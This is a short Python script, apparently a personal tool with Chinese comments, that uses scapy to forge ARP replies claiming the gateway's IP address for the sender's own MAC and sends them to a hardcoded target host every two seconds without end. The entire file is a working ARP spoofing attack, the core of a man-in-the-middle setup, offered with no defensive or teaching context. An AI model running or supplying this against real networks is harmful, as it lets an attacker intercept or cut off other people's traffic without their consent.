#coding=utf-8
import os,sys
from scapy.all import (
  ARP,
  Ether,
  sendp,
  getmacbyip,
  get_if_hwaddr
)
import signal
def build_packet(TargetIp, GateWayAddr):
    print("[-] Obtaining mac from {}".format(TargetIp)) #打印信息
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp) #获得imac地址
    MyMacAddr = get_if_hwaddr("en0") #获得网卡的mac地址
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr, pdst=TargetIp)
    pkt.show()
    print(pkt)
    return pkt

def stop(signal,frame):
    sys.exit(0)
if __name__ == '__main__':
    TargetIp = "192.168.31.152" #
    GateWayAddr = "192.168.31.1" #路由器地址/网关地址
    signal.signal(signal.SIGINT, stop)
    packet = build_packet(TargetIp, GateWayAddr)
    while True:
        sendp(packet, inter=2, iface="en0") #inter表示发送包的间隔,iface表示我们的网卡